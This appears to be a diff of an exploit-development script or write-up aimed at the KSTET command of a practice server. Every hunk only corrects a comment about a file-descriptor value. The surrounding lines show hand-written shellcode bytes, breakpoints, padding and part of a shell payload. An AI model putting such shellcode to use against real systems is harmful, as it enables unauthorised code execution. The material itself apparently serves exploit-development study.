@@ -223,7 +223,7 @@ command = "KSTET "
 # Software breakpoint to pause execution
 crash = "\xCC" * 2
 
-# Creating File Descriptor
+# Creating File Descriptor = 0x00000088
 crash += "\x31\xc9"			# xor ecx, ecx
 crash += "\x80\xc1\x88"			# add cl, 0x88
 crash += "\x51"				# push ecx
@@ -303,7 +303,7 @@ command = "KSTET "
 # Software breakpoint to pause execution
 crash = "\xCC" * 2
 
-# Creating File Descriptor
+# Creating File Descriptor = 0x00000088
 crash += "\x31\xc9"			# xor ecx, ecx
 crash += "\x80\xc1\x88"			# add cl, 0x88
 crash += "\x51"				# push ecx
@@ -375,7 +375,7 @@ command = "KSTET "
 # Software breakpoint to pause execution
 crash = "\xCC" * 2
 
-# Creating File Descriptor
+# Creating File Descriptor = 0x00000088
 crash += "\x31\xc9"			# xor ecx, ecx
 crash += "\x80\xc1\x88"			# add cl, 0x88
 crash += "\x51"				# push ecx
@@ -454,7 +454,7 @@ command = "KSTET "
 # Software breakpoint to pause execution
 crash = "\xCC" * 2
 
-# Creating File Descriptor = 0x00000090
+# Creating File Descriptor = 0x00000088
 crash += "\x31\xc9"			# xor ecx, ecx
 crash += "\x80\xc1\x88"			# add cl, 0x88
 crash += "\x51"				# push ecx
@@ -570,7 +570,7 @@ command = "KSTET "
 # Software breakpoint to pause execution
 crash = "\xCC" * 2
 
-# Creating File Descriptor = 0x00000090
+# Creating File Descriptor = 0x00000088
 crash += "\x31\xc9"			# xor ecx, ecx
 crash += "\x80\xc1\x88"			# add cl, 0x88
 crash += "\x51"				# push ecx
@@ -658,7 +658,7 @@ command = "KSTET "
 # Software breakpoint to pause execution
 crash = "\xCC" * 2
 
-# Creating file descriptor = 0x00000090
+# Creating file descriptor = 0x00000088
 crash += "\x31\xc9"			# xor ecx, ecx
 crash += "\x80\xc1\x88"			# add cl, 0x88
 crash += "\x51"				# push ecx
@@ -778,7 +778,7 @@ command = "KSTET "
 # Software breakpoint to pause execution
 crash = "\xCC" * 2
 
-# Creating file descriptor = 0x00000090
+# Creating file descriptor = 0x00000088
 crash += "\x31\xc9"			# xor ecx, ecx
 crash += "\x80\xc1\x88"			# add cl, 0x88
 crash += "\x51"				# push ecx
@@ -861,7 +861,7 @@ command = "KSTET "
 # Padding
 crash = "\x41" * 2
 
-# Creating file descriptor = 0x00000090
+# Creating file descriptor = 0x00000088
 crash += "\x31\xc9"			# xor ecx, ecx
 crash += "\x80\xc1\x88"			# add cl, 0x88
 crash += "\x51"				# push ecx
@@ -976,7 +976,7 @@ shell += "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
 # Padding
 crash = "\x41" * 2
 
-# Creating file descriptor = 0x00000090
+# Creating file descriptor = 0x00000088
 crash += "\x31\xc9"			# xor ecx, ecx
 crash += "\x80\xc1\x88"			# add cl, 0x88
 crash += "\x51"				# push ecx
